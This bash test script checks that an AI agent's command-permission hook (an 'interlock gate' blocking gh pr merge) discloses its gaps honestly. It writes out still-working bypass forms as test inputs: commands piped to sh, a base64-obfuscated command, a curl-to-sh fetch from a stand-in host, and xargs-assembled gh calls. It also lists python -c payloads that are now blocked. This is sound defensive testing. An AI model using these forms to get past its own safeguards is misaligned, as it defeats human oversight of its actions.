#!/bin/bash
# idc-assert-class: mixed
# interlock-known-bypass-disclosure.sh — F58 (+F63, narrowed by #192): the interlock's PUBLISHED
# scope matches what it actually classifies. ONE demonstrated channel class remains outside its
# reach; it is disclosed, and this lane keeps the disclosure and the behavior from drifting apart
# in EITHER direction.
#
# HISTORY. F58 originally disclosed THREE channel classes. #192 CLOSED two of them:
#   * the sanctioned-plugin-scripts channel — the blanket "anything under <plugin_root>/scripts/"
#     exemption became the pinned _SHIPPED_SCRIPTS manifest, so an agent-dropped helper in that
#     directory is scanned like any other target (section C holds it CLOSED, and holds the manifest
#     exemption OPEN for the plugin's own shipped names);
#   * the argv-list interpreter-payload channel — a scripting interpreter's inline `-c`/`-e`
#     payload is now text-matched in string form AND argv-list form, so
#     `python3 -c 'subprocess.run(["gh","pr","merge",…])'` and the `;`-less os.system string form
#     both DENY (section C holds them CLOSED).
# The remaining channel is PROGRAM TEXT THAT NEVER STANDS IN COMMAND POSITION (F63): an interpreter
# fed its program on stdin through a pipe (`… | sh`), and a protected argv assembled by a helper
# (`… | xargs gh`). Closing it means treating a targetless interpreter / runtime-argv helper as
# opaque — a widen-the-denial-surface design change that stays parked until reviewed. What is NOT
# acceptable is a published description implying coverage the gate does not have — or still
# publishing a CLOSED gap as an open one — so the scope is stated in both operator-facing surfaces
# and asserted here.
#
# F63 IS WHY THE CLOSED-WORLD SENTENCE IS BANNED. An earlier revision of this disclosure ended
# "Anything NOT on that list is in scope." That was FALSE — channel 3 was undisclosed at the time —
# and it reintroduced the exact defect (a guarantee stated broader than the code delivers) the
# disclosure exists to prevent. Section E asserts neither surface carries it again.
#
# THIS LANE IS NOT A BUG LOCK-IN. It never asserts "the bypass must keep working". It asserts that
# the DISCLOSURE and the BEHAVIOR agree. If a later change closes the remaining channel, this lane
# goes red with an explicit instruction to delete it from the disclosure — the gap closing must be
# accompanied by the published scope widening, in the same commit. (That is exactly how the two
# #192 closures landed.)
#
# What it proves:
#   A. hooks.json's operator-facing description names the remaining channel class as known
#      non-coverage, publishes the two #192 closures as COVERAGE, and no longer lists them as gaps;
#   B. the gate module's own docstring does the same, with honest scoping;
#   C. the controls still deny — the gate genuinely enforces in app-locked mode, so a "pass" here
#      can never come from a gate that denies nothing — INCLUDING the two channels #192 closed
#      (a flip back to allow is a reopened bypass AND a stale disclosure) and the covered siblings
#      that keep the remaining channel's scoping honest (`sh < FILE`, `xargs gh pr merge …`);
#      plus the POSITIVE control: a manifest-NAMED plugin script stays sanctioned (the denials
#      above cannot come from a gate that denies everything under scripts/);
#   D. reality matches the disclosure: the disclosed channel is in fact still uncovered (and if it
#      becomes covered, this fails LOUDLY telling you to update the disclosure);
#   E. neither surface republishes a closed-world completeness claim (F63).
#
# Usage: bash tests/smoke/governance/interlock-known-bypass-disclosure.sh   (exit 0 = pass)
set -uo pipefail
. "$(dirname "$0")/lib.sh"

GATE="$GOV_PLUGIN/scripts/hooks/idc_interlock_gate.py"
HOOKS="$GOV_PLUGIN/hooks/hooks.json"
RUNTIME="$GOV_PLUGIN/scripts/idc_python_runtime.sh"
[ -f "$GATE" ] || gov_fail "interlock gate not found at $GATE"
[ -f "$HOOKS" ] || gov_fail "hooks.json not found at $HOOKS"
[ -f "$RUNTIME" ] || gov_fail "shared runtime preflight not found at $RUNTIME"

WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT

# The DISCLOSURE sections (A, B, E) read source text and run on any interpreter. The BEHAVIOR
# sections (C, D) must actually execute the gate, which uses 3.10-only syntax — on an older ambient
# python3 every probe would return empty and read as "allow", i.e. the lane would either false-pass or
# red for an environment reason. `run-all.sh` is this project's declared pre-commit gate, so the
# behavior half SKIPS loudly instead (same posture as path-gate-runtime-failclosed.sh, F65). No
# assertion is relaxed: they either run in full or are reported as not run.
SKIPPED_BEHAVIOR=""
GATE_RUNNABLE=1
sh "$RUNTIME" || GATE_RUNNABLE=0

# --- A. the operator-facing description discloses the remaining channel, not the closed ones ------
timeout 60 python3 - "$HOOKS" <<'PY' || gov_fail "hooks.json does not match the interlock's published scope"
import json, re, sys
description = json.load(open(sys.argv[1], encoding="utf-8"))["description"]
assert "KNOWN NON-COVERAGE" in description, "no known-non-coverage section in the hooks description"
# The remaining channel (F63) — BOTH halves, each named in the operator-facing surface.
assert re.search(r"command position", description, re.I), \
    "the disclosure does not state the command-position boundary the remaining forms fall outside of"
assert re.search(r"stdin through a pipe", description, re.I), \
    "the stdin-piped-interpreter channel (`... | sh`) is not disclosed (F63)"
assert re.search(r"xargs", description), \
    "the helper-assembled-argv channel (`... | xargs gh`) is not disclosed (F63)"
assert re.search(r"assembled by a helper", description, re.I), \
    "the helper-assembled-argv channel is not named as a channel class (F63)"
# The two #192 closures are published as COVERAGE …
assert re.search(r"shipped-scripts manifest", description, re.I), \
    "the pinned shipped-scripts manifest (#192 closure of the plugin-scripts channel) is not published"
assert re.search(r"argv[- ]list", description, re.I), \
    "the argv-list interpreter-payload coverage (#192 closure) is not published"
# … and no longer listed as open gaps (the old channel headings must stay deleted — case-sensitive).
assert "SANCTIONED PLUGIN SCRIPTS" not in description, \
    "the CLOSED sanctioned-plugin-scripts channel is still published as an open gap (#192 closed it)"
assert "ARGV-LIST INTERPRETER PAYLOADS" not in description, \
    "the CLOSED argv-list interpreter channel is still published as an open gap (#192 closed it)"
print("ok: hooks.json discloses the remaining channel class and publishes the #192 closures as coverage")
PY

# --- B. the module's own docstring discloses them, and scopes them honestly -----------------------
timeout 60 python3 - "$GATE" <<'PY' || gov_fail "the interlock gate docstring does not publish its known non-coverage"
import ast, re, sys
doc = ast.get_docstring(ast.parse(open(sys.argv[1], encoding="utf-8").read())) or ""
assert "KNOWN NON-COVERAGE" in doc, "the gate docstring publishes no non-coverage section"
assert re.search(r"PROGRAM TEXT THAT NEVER STANDS IN COMMAND POSITION", doc), \
    "the remaining channel (F63) is not named in the docstring"
assert re.search(r"STDIN THROUGH A PIPE", doc), \
    "the docstring does not name the stdin-piped-interpreter form of the remaining channel (F63)"
assert re.search(r"ASSEMBLED BY A HELPER", doc), \
    "the docstring does not name the helper-assembled-argv form of the remaining channel (F63)"
assert re.search(r"WHERE THE BOUNDARY ACTUALLY RUNS", doc), \
    "the docstring states no classification boundary, so the channel's rationale cannot be checked (F63)"
assert re.search(r"pre-existing", doc, re.I), "the docstring does not scope the channel as pre-existing"
assert re.search(r"_SHIPPED_SCRIPTS", doc), \
    "the docstring does not name the pinned shipped-scripts manifest that replaced the Rule 5 blanket exemption (#192)"
assert "SANCTIONED PLUGIN SCRIPTS" not in doc, \
    "the CLOSED sanctioned-plugin-scripts channel is still listed in the docstring as an open gap (#192 closed it)"
assert "ARGV-LIST INTERPRETER PAYLOADS" not in doc, \
    "the CLOSED argv-list interpreter channel is still listed in the docstring as an open gap (#192 closed it)"
print("ok: the gate docstring publishes the remaining channel class with honest scoping, closed channels deleted")
PY

if [ "$GATE_RUNNABLE" -eq 0 ]; then
  SKIPPED_BEHAVIOR=" (behavior sections C/D SKIPPED — see the SKIP line above)"
  echo "SKIP: the ambient python3 ($(python3 --version 2>&1)) predates 3.10, so the interlock gate cannot be executed here and every probe would read as 'allow'. Sections C and D (behavior) are skipped; the disclosure assertions A, B and E DID run against the shipped source and passed."
else

# --- fixture: a governed, app-locked repo with no authorization -----------------------------------
REPO="$WORK/repo"
mkdir -p "$REPO/docs/workflow"
( cd "$REPO" && git init -q && git checkout -q -b main ) || gov_fail "could not init the fixture repo"
printf 'backend: github\n' > "$REPO/docs/workflow/tracker-config.yaml"
printf 'pathway_enforcement:\n  mode: app-locked\n' > "$REPO/WORKFLOW-config.yaml"

# A stand-in plugin root, so the scripts-manifest probes never write into the real checkout.
# `payload.sh` is NOT a shipped-manifest name (the #192 deny control); `lint-references.sh` IS one
# (the positive sanctioned control) — same protected body in both, so the NAME alone decides.
FAKE_ROOT="$WORK/plugin"
mkdir -p "$FAKE_ROOT/scripts"
printf '#!/bin/sh\ngh pr merge 123 --squash\ngh issue close 5\n' > "$FAKE_ROOT/scripts/payload.sh"
printf '#!/bin/sh\ngh pr merge 123 --squash\ngh issue close 5\n' > "$FAKE_ROOT/scripts/lint-references.sh"
printf '#!/bin/sh\ngh pr merge 123 --squash\ngh issue close 5\n' > "$FAKE_ROOT/outside.sh"

# verdict <command> -> "deny" | "allow"
verdict() {
  local cmd="$1" json
  json="$(CMD="$cmd" REPO="$REPO" timeout 60 python3 -c '
import json, os
print(json.dumps({"cwd": os.environ["REPO"], "tool_name": "Bash", "session_id": "f58-disclosure",
                  "tool_input": {"command": os.environ["CMD"]}}))')"
  if printf '%s' "$json" | timeout 60 python3 "$GATE" "$FAKE_ROOT" 2>/dev/null \
      | grep -q '"permissionDecision" *: *"deny"'; then echo deny; else echo allow; fi
}

# --- C. controls — the gate really is enforcing, the #192 closures hold, covered siblings stay ----
# Every "allow" asserted in section D is only meaningful if this section's denials hold: a gate that
# denies nothing (a broken import, a missing helper binary, a mis-built fixture) reads as all-allow.
[ "$(verdict 'gh pr merge 123 --squash')" = deny ] \
  || gov_fail "the control (inline gh pr merge, app-locked, no authorization) was NOT denied — this lane cannot distinguish a disclosed gap from a gate that denies nothing"
[ "$(verdict "bash '$FAKE_ROOT/outside.sh'")" = deny ] \
  || gov_fail "indirection through a script OUTSIDE the plugin's scripts/ dir was not denied — the indirection classifier itself has regressed, which is not a disclosed gap"
# The remaining channel's scoping depends on these two staying DENIED. `sh < FILE` is the redirection
# sibling of the piped form, and `xargs gh <subcommand>` is the same-segment sibling of the helper
# form; if either flips to allow, the published non-coverage silently widens past what F63 disclosed.
[ "$(verdict "sh < '$FAKE_ROOT/outside.sh'")" = deny ] \
  || gov_fail "the redirection sibling (\`sh < FILE\`) was NOT denied — the disclosure scopes the remaining channel to a program arriving on a PIPE, and says the file-redirection form is covered; that scoping is now false"
[ "$(verdict 'xargs gh pr merge 123')" = deny ] \
  || gov_fail "a same-segment helper form (\`xargs gh pr merge 123\`) was NOT denied — the disclosure scopes the helper form to an argv assembled at RUNTIME out of another segment, so this widens undisclosed non-coverage"
# #192 closure 1 — a NON-manifest file dropped into <plugin_root>/scripts/ is scanned and denied.
[ "$(verdict "bash '$FAKE_ROOT/scripts/payload.sh'")" = deny ] \
  || gov_fail "an agent-dropped helper under the plugin's scripts/ dir was NOT denied — the #192 shipped-scripts manifest has regressed to the blanket dir-prefix exemption, reopening a channel the disclosure says is CLOSED"
# … while a manifest-NAMED shipped script stays sanctioned (the positive control: the deny above is
# the manifest discriminating, not a gate that denies everything under scripts/).
[ "$(verdict "bash '$FAKE_ROOT/scripts/lint-references.sh'")" = allow ] \
  || gov_fail "a shipped-manifest script name was DENIED — the Rule 5 manifest exemption has stopped admitting the plugin's own helpers (sanctioned-path regression)"
# #192 closure 2 — scripting-interpreter inline payloads deny in argv-list AND string form.
[ "$(verdict 'python3 -c '"'"'import subprocess; subprocess.run(["gh","pr","merge","123"])'"'"'')" = deny ] \
  || gov_fail "an argv-list interpreter payload (subprocess.run([\"gh\",\"pr\",\"merge\",…])) was NOT denied — the #192 payload text-matcher has regressed, reopening a channel the disclosure says is CLOSED"
[ "$(verdict 'python3 -c '"'"'os.system("gh pr merge 123 --squash")'"'"'')" = deny ] \
  || gov_fail "a cleanly-tokenizing text-form interpreter payload (os.system with no embedded \`;\`) was NOT denied — the #192 payload text-matcher has regressed, reopening a channel the disclosure says is CLOSED"
# The `;`-bearing text form was covered even BEFORE #192 (the tokenize-failure backstop) — it must
# obviously stay covered now that the whole payload channel is closed.
[ "$(verdict 'python3 -c '"'"'import os; os.system("gh pr merge 123 --squash")'"'"'')" = deny ] \
  || gov_fail "a text-form interpreter payload (os.system with the call as a string, split by an embedded \`;\`) was NOT denied — this form has been covered since before #192, so the payload classifier has regressed"

# --- D. reality matches the disclosure ------------------------------------------------------------
# F63 — an interpreter fed its program on stdin through a pipe.
for piped in \
  'echo "gh pr merge 123 --squash" | sh' \
  "cat '$FAKE_ROOT/outside.sh' | bash" \
  'curl -s https://example.invalid/p.sh | sh' \
  'echo Z2ggcHIgbWVyZ2UgMTIz | base64 -d | sh'
do
  if [ "$(verdict "$piped")" = deny ]; then
    gov_fail "GOOD NEWS, STALE DOCS: the stdin-piped-interpreter channel is now COVERED (denied: $piped). Delete form (a) of the remaining channel from the KNOWN NON-COVERAGE sections in hooks/hooks.json and scripts/hooks/idc_interlock_gate.py, and retire this assertion — a closed gap must never stay published as an open one."
  fi
done
# F63 — a protected argv assembled by a helper at runtime.
if [ "$(verdict 'echo "pr merge 123" | xargs gh')" = deny ]; then
  gov_fail "GOOD NEWS, STALE DOCS: the helper-assembled-argv channel is now COVERED. Delete form (b) of the remaining channel from the KNOWN NON-COVERAGE sections in hooks/hooks.json and scripts/hooks/idc_interlock_gate.py, and retire this assertion."
fi

fi

# --- E. neither surface republishes a closed-world completeness claim (F63) ------------------------
# The defect F63 caught was not a missing channel — it was the sentence "Anything NOT on that list is
# in scope", which asserted a closed world this classifier cannot deliver. A disclosure that
# re-acquires a completeness claim is worse than one that is merely incomplete.
timeout 60 python3 - "$HOOKS" "$GATE" <<'PY' || gov_fail "a known-non-coverage surface republishes a closed-world completeness claim (F63)"
import ast, json, re, sys

# Deliberately narrow: each pattern is an AFFIRMATIVE completeness claim. Phrases that DENY
# completeness ("not read as a complete barrier", "not a complete shell parser") must stay legal —
# they are the disclosure doing its job.
CLOSED_WORLD = [
    r"anything\s+(not\s+on|other\s+than)[^.]{0,60}\bis\s+in\s+scope",
    r"everything\s+(else|not\s+listed)\s+is\s+(in\s+scope|covered|caught|denied)",
    r"(this\s+)?(list|enumeration|disclosure|section)\s+is\s+(exhaustive|complete|closed)",
    r"the\s+only\s+(known\s+)?(gaps?|bypass(es)?|channels?|non[- ]coverage)",
]
surfaces = {
    "hooks.json description": json.load(open(sys.argv[1], encoding="utf-8"))["description"],
    "idc_interlock_gate.py docstring": ast.get_docstring(
        ast.parse(open(sys.argv[2], encoding="utf-8").read())) or "",
}
for name, text in surfaces.items():
    for pattern in CLOSED_WORLD:
        hit = re.search(pattern, text, re.I)
        assert not hit, (
            f"{name} carries a closed-world completeness claim ({hit.group(0)!r}) — this classifier "
            "is defense-in-depth, not a complete shell parser, so it cannot promise that an "
            "unlisted construct is in scope (F63)")
    assert re.search(r"not\s+a\s+closed\s+world", text, re.I), (
        f"{name} does not state that the disclosed list is NOT a closed world — without that, a "
        "reader takes the enumeration for the whole boundary (F63)")
print("ok: neither surface claims a closed world, and both say so explicitly")
PY

echo "PASS: the interlock publishes its one remaining uncovered channel class in both operator-facing surfaces, holds the two #192 closures CLOSED (dropped-helper scripts under scripts/, argv-list + string interpreter payloads) while the shipped-manifest names stay sanctioned, still denies the controls and every covered sibling (inline, outside-script indirection, \`sh < FILE\`, same-segment \`xargs gh <sub>\`, the \`;\`-split text payload), claims no closed world, and the disclosure matches observed behavior (this lane reds if the disclosure, the gap, or the honest scoping disappears)${SKIPPED_BEHAVIOR}"
